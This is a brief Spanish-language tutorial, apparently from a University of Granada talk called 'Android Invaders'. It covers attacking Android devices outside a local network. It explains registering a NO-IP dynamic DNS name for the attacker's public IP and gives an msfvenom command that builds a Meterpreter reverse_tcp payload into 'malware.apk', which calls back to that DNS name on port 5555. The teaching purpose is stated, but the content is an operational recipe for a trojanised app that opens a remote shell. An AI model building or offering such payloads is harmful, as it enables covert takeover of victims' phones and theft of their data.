#Android Invaders - Ataques fuera de LAN

![Logo](images/logo.png)

##Algunas notas sobre NO IP

Para ataques fuera de LAN es interesante el uso de NOIP en vez de IP Pública (que va cambiando cada cierto tiempo). Un breve [tutorial](https://www.youtube.com/watch?v=dH_TbQDwxSs) y la dirección que se usa para crear la [NO IP](http://www.noip.com/), que nos da una dirección DNS para nuestra IP pública.

Creamos una dirección NOIP como **nombre.ddns.net** (creando una cuenta de usuario) y le asignamos nuestra ip publica. Para saber cual es tendremos que entrar en:

  www.cualesmiip.com

##Ejemplo de la charla

Por ejemplo, para crear el APK que hemos hecho antes:

      msfvenom -p android/meterpreter/reverse_tcp LHOST=nombre.ddns.net LPORT=5555 R> malware.apk

##Notas del autor

Este tutorial fue realizado para una charla informativa para la Universidad de Granada, el autor o autores de él no se hacen responsables del mal uso que se pueda dar. Sed buenos. }:)
